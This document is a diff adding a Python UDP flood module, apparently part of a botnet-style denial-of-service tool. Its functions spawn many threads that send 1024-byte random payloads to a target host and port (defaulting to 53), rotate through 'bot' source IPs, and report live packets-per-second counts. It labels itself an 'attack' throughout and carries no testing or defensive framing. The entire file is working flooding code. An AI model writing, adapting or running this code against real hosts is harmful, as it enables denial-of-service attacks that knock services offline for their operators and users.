@@ -1,0 +1,128 @@
+import socket
+import threading
+import time
+from concurrent.futures import ThreadPoolExecutor
+import random
+import sys
+
+RED = '\033[91m'
+GRAY = '\033[90m'
+RESET = '\033[0m'
+
+stop_attack = False
+
+def send_udp_packet(target, thread_id, delay, bot_ip=None):
+    """Send UDP packets to target"""
+    global stop_attack
+    if stop_attack:
+        return
+
+    try:
+        if ":" in target:
+            host, port = target.split(":")
+            port = int(port)
+        else:
+            host = target
+            port = 53
+
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(0.5)
+
+        # Try to bind to bot IP if available (simulating bot connection)
+        if bot_ip:
+            try:
+                sock.bind((bot_ip, 0))
+            except:
+                pass
+
+        payload = bytes([random.randint(0, 255) for _ in range(1024)])
+
+        try:
+            sock.sendto(payload, (host, port))
+            return True
+        except:
+            return False
+        finally:
+            sock.close()
+
+    except:
+        return False
+
+def start_attack(target, settings, bots=None):
+    """Start UDP flood attack"""
+    global stop_attack
+    stop_attack = False
+
+    duration = settings['duration']
+    threads = settings['threads']
+    delay = settings.get('delay', 0)
+
+    # Use bots if provided, otherwise use threads count
+    bot_count = len(bots) if bots else 0
+    effective_threads = max(threads, bot_count) if bot_count > 0 else threads
+
+    print(f"  Target: {target}")
+    print(f"  Duration: {duration}s")
+    print(f"  Threads: {threads}")
+    print(f"  Active Bots: {bot_count}")
+    print(f"  Total Workers: {effective_threads}")
+    print(f"  Delay: {delay}ms")
+    print("  " + "-" * 45)
+    print(f"  {GRAY}Press Ctrl+C to stop attack{RESET}")
+    print()
+
+    start_time = time.time()
+    sent_packets = 0
+    successful_packets = 0
+    last_update = start_time
+    last_count = 0
+    futures = []
+
+    def worker():
+        nonlocal sent_packets, successful_packets
+        while not stop_attack and (time.time() - start_time) < duration:
+            # Pick random bot IP if available
+            bot_ip = None
+            if bots and len(bots) > 0:
+                bot = random.choice(bots)
+                bot_ip = bot.get('ip')
+            if send_udp_packet(target, threading.current_thread().ident, delay, bot_ip):
+                successful_packets += 1
+            sent_packets += 1
+            time.sleep(0.01)
+
+    try:
+        executor = ThreadPoolExecutor(max_workers=effective_threads)
+        for _ in range(effective_threads):
+            futures.append(executor.submit(worker))
+
+        while not stop_attack and (time.time() - start_time) < duration:
+            time.sleep(0.5)
+            elapsed = time.time() - start_time
+            if elapsed - last_update >= 1:
+                interval = elapsed - last_update
+                rps = (sent_packets - last_count) / max(interval, 0.001)
+                last_count = sent_packets
+                last_update = elapsed
+                print(f"  {GRAY}Sent: {sent_packets} | Success: {successful_packets} | Time: {elapsed:.1f}s | RPS: {rps:.1f} | Bots: {bot_count}{RESET}", end='\r')
+
+        stop_attack = True
+        for future in futures:
+            future.cancel()
+        executor.shutdown(wait=False)
+
+    except KeyboardInterrupt:
+        stop_attack = True
+        print(f"\n  {RED}Attack stopped by user{RESET}")
+        for future in futures:
+            future.cancel()
+        executor.shutdown(wait=False)
+
+    elapsed = time.time() - start_time
+    avg_rps = sent_packets / elapsed if elapsed > 0 else 0
+    print()
+    print("  " + "-" * 45)
+    print(f"  Attack completed!")
+    print(f"  Total packets sent: {sent_packets}")
+    print(f"  Elapsed time: {elapsed:.2f}s")
+    print(f"  Average RPS: {avg_rps:.2f}")
